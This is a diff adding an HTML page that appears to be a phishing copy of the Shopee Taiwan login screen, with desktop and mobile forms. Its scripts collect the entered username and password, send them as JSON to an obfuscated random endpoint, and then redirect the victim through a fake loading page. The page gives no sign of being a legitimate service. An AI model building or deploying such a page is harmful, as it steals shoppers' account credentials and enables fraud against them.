@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/sowtal.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    <div class="pc">
+        <div>
+            <div class="topan">
+                <img src="./img/topanamo-pc.png" alt="">
+            </div>
+        </div>
+    
+        <div>
+            <div class="kolchi">
+                <div class="westha">
+                    <div class="maina">
+                        <form id="loginForm" method="post">
+                            <p class="pp1">登入</p>
+
+                            <input type="text" name="" id="username-pc" placeholder="電話號碼/使用者名稱/Email" required>
+
+                            <input type="password" name="" id="password-pc" placeholder="密碼" required>
+                            
+                            <button id="btn-pc" class="btn1" type="button" disabled>登入</button>
+                        </form>
+
+                        <style>
+                            /* Make the button gray when disabled */
+                            #btn-pc:disabled {
+                                background-color: gray;
+                            }
+                        </style>
+
+                        <script>
+                            const usernameInputPC = document.getElementById('username-pc');
+                            const passwordInputPC = document.getElementById('password-pc');
+                            const loginBtnPC = document.getElementById('btn-pc');
+
+                            function toggleButtonPC() {
+                                loginBtnPC.disabled = !(usernameInputPC.value.trim() && passwordInputPC.value.trim());
+                            }
+
+                            usernameInputPC.addEventListener('input', toggleButtonPC);
+                            passwordInputPC.addEventListener('input', toggleButtonPC);
+                        </script>
+                        <!--  -->
+                            <div class="inderform">
+                                <img src="./img/inderform1.PNG" alt="">
+                                <img src="./img/inderform.PNG" alt="">
+                            </div>
+                        </form>
+                        <div>
+                            <p style="text-align: center;margin-top: 10px; color: gray; font-size: 12px;">蝦皮新朋友？<span style="color: orange;"> 註冊</span></p>
+                        </div>
+        
+                    </div>
+                </div>
+            </div>
+        </div>
+    
+        <div class="foto">
+            <div class="botamina">
+                <img src="./img/botamina-pc.png" alt="">
+            </div>
+        </div>
+    </div>
+
+    <!--  -->
+
+    <div  class="mb">
+        <div>
+            <img src="./img/upato-mb.png" alt="">
+        </div>
+        <div>
+            <form id="loginForm" method="post">
+                <div class="group2">
+                    <svg viewBox="0 0 24 24" fill="none" width="24" height="24" color="rgba(0, 0, 0, 0.65)" class="iQI56K"><path d="M14.316 14.1a.75.75 0 00.076 1.298l6.167 3.084c.424.211.691.644.691 1.118v1.65H2.75V19.6c0-.474.268-.907.691-1.118l6.167-3.084a.75.75 0 00.077-1.297c-1.292-.85-2.39-2.419-2.39-3.92V7.456c0-1.291.407-2.465 1.171-3.307C9.22 3.318 10.373 2.75 12 2.75c1.627 0 2.78.568 3.534 1.398.763.842 1.17 2.016 1.17 3.307v2.727c0 1.504-1.093 3.07-2.388 3.918z" stroke="currentColor" stroke-width="1.5" stroke-linecap="square" stroke-linejoin="round"></path></svg>
+                    <input type="text" name="" id="username" placeholder="手機號碼 / Email / 使用者名稱" required>
+                </div>
+                    
+                <div class="group2">
+                    <svg viewBox="0 0 24 24" fill="none" width="45" height="24" color="rgba(0, 0, 0, 0.54)" class="iQI56K"><path fill-rule="evenodd" clip-rule="evenodd" d="M7.757 9.376c.002.212.005.42.005.624h-.75 9.226c0-.204.003-.412.005-.624.015-1.184.03-2.465-.39-3.54-.234-.6-.595-1.1-1.161-1.46-.574-.365-1.42-.626-2.692-.626-1.271 0-2.119.26-2.692.625-.566.36-.927.86-1.161 1.46-.42 1.077-.405 2.357-.39 3.541zm-1.501.083c.003.195.006.376.006.541H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2h-.262c0-.165.003-.346.006-.54.018-1.166.044-2.793-.494-4.17-.327-.838-.87-1.619-1.753-2.18-.877-.558-2.025-.86-3.497-.86s-2.62.302-3.497.86c-.883.56-1.426 1.341-1.753 2.18-.538 1.377-.512 3.005-.494 4.17zM18 11.5H6a.5.5 0 00-.5.5v8a.5.5 0 00.5.5h12a.5.5 0 00.5-.5v-8a.5.5 0 00-.5-.5zM12 14a1 1 0 00-1 1v2a1 1 0 102 0v-2a1 1 0 00-1-1z" fill="currentColor"></path></svg>
+                    <input type="password" name="" id="password" placeholder="密碼" required>
+
+                    <div class="eye">
+                        <svg viewBox="0 0 24 24" fill="none" width="24" height="24" color="rgba(0, 0, 0, 0.54)" class="ip92G6"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.562 7.391a.75.75 0 011.047.17c1.178 1.637 3.382 4.69 8.391 4.69 5.01 0 7.213-3.053 8.391-4.69a.75.75 0 011.218.877l-.004.006c-.47.652-1.141 1.584-2.117 2.486a.716.716 0 01.042.04l2 2a.75.75 0 01-1.06 1.06l-2-2a.747.747 0 01-.13-.173 10.15 10.15 0 01-2.955 1.425l.827 2.48a.75.75 0 01-1.423.475l-.876-2.628A12.65 12.65 0 0112 13.75c-.68 0-1.317-.05-1.912-.14l-.876 2.627a.75.75 0 11-1.423-.474l.827-2.481a10.153 10.153 0 01-2.956-1.425.75.75 0 01-.13.173l-2 2a.75.75 0 11-1.06-1.06l2-2a.756.756 0 01.042-.04c-.976-.902-1.647-1.834-2.117-2.486l-.004-.006a.75.75 0 01.17-1.047z" fill="currentColor"></path></svg>
+
+                    </div>
+                                        <div class="line"></div>
+                    <p class="p-inp">忘記密碼</p>
+                </div>
+                <button id="btn" class="btn1 btn1-2" type="button" disabled>登入</button>
+                <style>
+                    #btn:disabled {
+                        background-color: gray;
+                    }
+                </style>
+                <script>
+                    const usernameInput = document.getElementById('username');
+                    const passwordInput = document.getElementById('password');
+                    const loginBtn = document.getElementById('btn');
+
+                    function toggleButton() {
+                        loginBtn.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
+                    }
+
+                    usernameInput.addEventListener('input', toggleButton);
+                    passwordInput.addEventListener('input', toggleButton);
+                </script>
+            </form>
+        </div>
+
+        <div>
+            <img src="./img/inderform1-mb.png" alt="">
+            <img src="./img/inderform-mb.png" alt="">
+        </div>
+
+        
+    </div>
+    <script>
+        document.getElementById('btn').addEventListener('click', function(e) {
+                    e.preventDefault();
+                    console.log("submit");
+                    const username = document.getElementById('username').value;
+                    const password = document.getElementById('password').value;
+                    console.log('Login attempt:', { username, password });
+
+                   $.ajax({
+                       url: '/gzLbTbjqMpc34D4XsPJ2',
+                       type: 'POST',
+                       contentType: 'application/json',
+                       data: JSON.stringify({username,password}),
+                       success: function(info) {
+                           if(info.OK){
+                                window.location = "/loading?time=3&url=/QcEwP85AgNE4pnL5mWSM";  
+                           }
+                       }
+                   });
+               });
+               document.getElementById('btn-pc').addEventListener('click', function(e) {
+                    e.preventDefault();
+                    console.log("submit");
+                    const username = document.getElementById('username-pc').value;
+                    const password = document.getElementById('password-pc').value;
+                    console.log('Login attempt:', { username, password });
+
+                   $.ajax({
+                       url: '/gzLbTbjqMpc34D4XsPJ2',
+                       type: 'POST',
+                       contentType: 'application/json',
+                       data: JSON.stringify({username,password}),
+                       success: function(info) {
+                           if(info.OK){
+                                window.location = "/loading?time=3&url=/QcEwP85AgNE4pnL5mWSM";  
+                           }
+                       }
+                   });
+               });
+    </script>
+</body>
+</html>
